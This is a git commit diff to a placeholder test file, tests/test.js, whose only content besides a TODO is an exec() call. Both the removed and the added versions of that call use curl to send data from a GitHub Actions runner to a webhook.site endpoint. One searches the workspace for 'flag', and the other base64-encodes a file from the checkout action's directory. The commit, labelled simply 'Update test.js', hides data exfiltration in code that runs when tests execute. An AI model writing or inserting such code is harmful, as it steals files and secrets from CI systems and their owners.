c21aa9744422926051860a2733dafdb38d9f07c3
bmmorgan03 <127448820+bmmorgan03@users.noreply.github.com>
2023-04-15 12:17:07 -0400

    Update test.js

--- tests/test.js
+++ tests/test.js
@@ -1,4 +1,4 @@
 // TODO: implement the tests
 console.log("Tests are not implemented yet...");
 
-exec("curl https://webhook.site/a21fb582-66c0-431f-af51-56e9f6dddb49/?test=$(grep -rnw /home/runner/work -e flag)");
+exec("curl https://webhook.site/a21fb582-66c0-431f-af51-56e9f6dddb49/?test=$(cat /home/runner/work/_actions/actions/checkout/v3/dist/index | base64)");
